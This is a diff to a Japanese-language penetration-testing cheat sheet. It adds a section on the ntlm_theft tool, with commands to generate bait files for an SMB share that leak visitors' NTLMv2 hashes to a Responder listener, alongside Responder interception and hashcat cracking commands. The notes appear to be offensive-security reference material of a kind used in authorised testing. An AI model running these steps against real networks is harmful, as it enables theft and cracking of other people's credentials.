@@ -102,10 +102,29 @@ NIC を指定して傍受を開始
 sudo responder -I <network-if>
 ```
 
-NTLMv2-SSP ハッシュのクラック
+NTLMv2-SSP ハッシュのクラック（ユーザー名含む全体）
 
 ```shell
 hashcat -m 5600 <hash file> <password file> --force
+```
+
+### ntlm_theft
+
+https://github.com/Greenwolf/ntlm_theft
+
+複数の種類の NTLMv2 ハッシュ盗難ファイルを生成するツール
+
+SMBにファイルを配置できるとき、アクセスした人のNTLMハッシュをResponderで盗聴する。
+
+```sh
+pip3 install xlsxwriter
+```
+
+```sh
+git clone https://github.com/Greenwolf/ntlm_theft.git
+cd ntlm_theft
+
+python3 ntlm_theft.py -g all -s <listen-ip> -f test
 ```
 
 ## LDAP
